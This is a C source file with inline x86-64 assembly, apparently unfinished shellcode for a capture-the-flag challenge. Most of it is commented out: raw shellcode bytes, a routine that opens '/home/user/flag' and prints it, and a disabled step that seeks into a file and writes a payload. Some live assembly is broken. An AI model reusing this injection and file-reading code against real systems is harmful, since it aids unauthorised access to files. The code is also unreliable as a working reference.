#define _GNU_SOURCE
#include <unistd.h>
#include <stdint.h>
#include <syscall.h>
#include <sys/stat.h>
#include <sched.h>
void sc() {
    uint32_t flag_fd = 0;
    uint32_t ret = 0;
    uint32_t err = 0;

/*
    char payload[] = {
            0x48,0x89,0xfe,0x48,
            0xc7,0xc0,0x28,0x00,
            0x00,0x00,0x48,0xc7,
            0xc7,0x01,0x00,0x00,
            0x00,0x48,0xc7,0xc2,
            0x00,0x00,0x00,0x00,
            0x49,0xc7,0xc2,0x12,
            0x00,0x00,0x00,0x0f,
            0x05};
    char not_flag[] = "NOT_FLAG";
    char mem_str[] = "/home/user/flag";
*/

//    void * shellcode;
//    unt32_t shellcode_len = 40;
//    asm volatile(
//        "push $0x00000005\n\t"
//        "push $0x0f000000\n\t"
//        "push $0x12c2c749\n\t"
//        "push $0x00000000\n\t"
//        "push $0xc2c74800\n\t"
//        "push $0x000001c7\n\t"
//        "push $0xc7480000\n\t"
//        "push $0x0028c0c7\n\t"
//        "push $0x48fe8948\n\t"
//        "mov %%rax, %%rsp"
//        : "=a"(shellcode)
//        :
//        : "memory"
//    );

    void * flag_path;
    int32_t flag_len = 16;
    asm volatile(
        "mov %%rax, $0x0067616c\n\t"
        "push %%rax\n\t"
        "push %%rax\n\t"
        "push %%rax\n\t"
//        "push $0x662f7265\n\t"
//        "push $0x73752f65\n\t"
//        "push $0x6d6f682f\n\t"
        "mov %%rax, %%rsp"
        : "=a"(flag_path)
        :
        : "memory"
    );


    // write stack to stdout
    asm volatile (
      "syscall"
      : "=a"(ret)
      : "a"(__NR_write), "D"(1), "S"(flag_path), "d"(flag_len)
      : "rcx", "memory");

//    // open fd for flag file
//    asm volatile (
//      "syscall"
//      : "=a"(flag_fd)
//      : "a"(__NR_open), "D"(mem_str), "S"(0), "d"(0)
//      : "rcx", "memory");
//
//    // write ret to stdout
//    asm volatile (
//      "syscall"
//      : "=a"(ret)
//      : "a"(__NR_write), "D"(1), "S"(&flag_fd), "d"(sizeof(flag_fd))
//      : "rcx", "memory");
//
//    asm volatile (
//      "syscall"
//      : "=a"(ret)
//      : "a"(__NR_write), "D"(ret), "S"(not_flag), "d"(sizeof(not_flag))
//      : "rcx", "memory");
//
////    asm volatile (
////      "syscall"
////      : "=a"(ret)
////      : "a"(__NR_lseek), "D"(ret), "S"(0x401b9d), "d"(SEEK_SET)
////      : "rcx", "memory");
//
////    asm volatile (
////      "syscall"
////      : "=a"(ret)
////      : "a"(__NR_write), "D"(ret), "S"(payload), "d"(sizeof(payload))
////      : "rcx", "memory");
//
//
//    while(1) {
//        asm volatile (
//          "syscall"
//          : "=a"(ret)
//          : "a"(__NR_sched_yield)
//          : "rcx", "memory");
//    }
}

